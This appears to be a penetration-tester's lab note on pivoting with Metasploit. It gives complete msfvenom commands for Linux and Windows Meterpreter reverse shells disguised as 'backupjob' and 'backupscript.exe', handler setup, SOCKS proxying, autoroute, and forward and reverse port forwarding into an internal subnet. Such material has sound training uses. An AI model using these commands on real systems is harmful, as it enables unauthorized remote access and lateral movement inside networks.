Meterpreter Tunneling and Port Forwarding
############################################

Date: 2024-11-02 14:33

Status:

Tags: 

Description 
************

There are situation where you may want to drop a shell on the pivot host instead of using SSH

Creating a shell on the pivot host
*************************************

Step 1. Create the shell and upload it to the pivot host

.. code-block:: console

    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 130 bytes
    Final size of elf file: 250 bytes
    Saved as: backupjob

Step 2: Configure and start the multi handler

.. code-block:: console

    msf6 > use exploit/multi/handler

    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    lhost => 0.0.0.0
    msf6 exploit(multi/handler) > set lport 8080
    lport => 8080
    msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
    payload => linux/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > run
    [*] Started reverse TCP handler on 0.0.0.0:8080 


step 3: Run the shell on the pivot server

.. code-block:: console

    ubuntu@WebServer:~$ ls

    backupjob
    ubuntu@WebServer:~$ chmod +x backupjob 
    ubuntu@WebServer:~$ ./backupjob



Now that we are connected to the pivot host via the created shell, we can scan that network. 

.. code-block:: console

    meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

    [*] Performing ping sweep for IP range 172.16.5.0/23


Configuring MSF's SOCKS Proxy
**************************************

**Setup**

.. code-block:: console

    msf6 > use auxiliary/server/socks_proxy

    msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
    SRVPORT => 9050
    msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
    SRVHOST => 0.0.0.0
    msf6 auxiliary(server/socks_proxy) > set version 4a
    version => 4a
    msf6 auxiliary(server/socks_proxy) > run
    [*] Auxiliary module running as background job 0.

    [*] Starting the SOCKS proxy server
    msf6 auxiliary(server/socks_proxy) > options

    Module options (auxiliary/server/socks_proxy):

    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    SRVHOST  0.0.0.0          yes       The address to listen on
    SRVPORT  9050             yes       The port to listen on
    VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                            5)


    Auxiliary action:

    Name   Description
    ----   -----------
    Proxy  Run a SOCKS proxy server

**Verify Running** 

.. code-block:: console

    msf6 auxiliary(server/socks_proxy) > jobs

    Jobs
    ====

    Id  Name                           Payload  Payload opts
    --  ----                           -------  ------------
    0   Auxiliary: server/socks_proxy

**Setup proxy chains** 

Ensure your config file reflects your port

.. code-block:: console

    socks4 	127.0.0.1 9050

Finally tell the SOCKS module to route all traffic via our Meterpreter session. 

.. code-block:: console

    msf6 > use post/multi/manage/autoroute

    msf6 post(multi/manage/autoroute) > set SESSION 1
    SESSION => 1
    msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
    SUBNET => 172.16.5.0
    msf6 post(multi/manage/autoroute) > run

    [!] SESSION may not be compatible with this module:
    [!]  * incompatible session platform: linux
    [*] Running module against 10.129.202.64
    [*] Searching for subnets to autoroute.
    [+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
    [+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
    [*] Post module execution completed

It is also possible to add routes with `autoroute` by running autoroute from the Meterpreter session. 

.. code-block:: console

    meterpreter > run autoroute -s 172.16.5.0/23

    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
    [!] Example: run post/multi/manage/autoroute OPTION=value [...]
    [*] Adding a route to 172.16.5.0/255.255.254.0...
    [+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
    [*] Use the -p option to list all active routes


Listing active routes with Autoroute
****************************************

.. code-block:: console 

    meterpreter > run autoroute -p

    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
    [!] Example: run post/multi/manage/autoroute OPTION=value [...]

    Active Routing Table
    ====================

    Subnet             Netmask            Gateway
    ------             -------            -------
    10.129.0.0         255.255.0.0        Session 1
    172.16.4.0         255.255.254.0      Session 1
    172.16.5.0         255.255.254.0      Session 1

Testing the proxychain config
**************************************

.. code-block:: console

    proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn


Port Forwarding with MSF
************************

There is a module in msf that forwards ports.  We can use the shell on the remote host and forward ports. 

.. code-block:: console

    meterpreter > help portfwd

    Usage: portfwd [-h] [add | delete | list | flush] [args]


    OPTIONS:

        -h        Help banner.
        -i <opt>  Index of the port forward entry to interact with (see the "list" command).
        -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
        -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
        -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
        -r <opt>  Forward: remote host to connect to.
        -R        Indicates a reverse port forward.

.. code-block:: console

    meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

    [*] Local TCP relay created: :3300 <-> 172.16.5.19:3389

The above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.


Meterpreter Reverse Port Forwarding
***********************************

Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.

We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.

Step 1.  Reverse port forwarding rules

.. code-block:: console

    meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

    [*] Local TCP relay created: 10.10.14.18:8081 <-> :1234

Step 2: Configure and starting multi/handler

.. code-block:: console

    meterpreter > bg

    [*] Backgrounding session 1...
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
    payload => windows/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LPORT 8081 
    LPORT => 8081
    msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
    LHOST => 0.0.0.0
    msf6 exploit(multi/handler) > run

    [*] Started reverse TCP handler on 0.0.0.0:8081 

We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.

Generating the Windows payload
**************************************

.. code-block:: console

     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234


Finally if we execute this payload on the Windows server we should get a shell via the pivot server. 

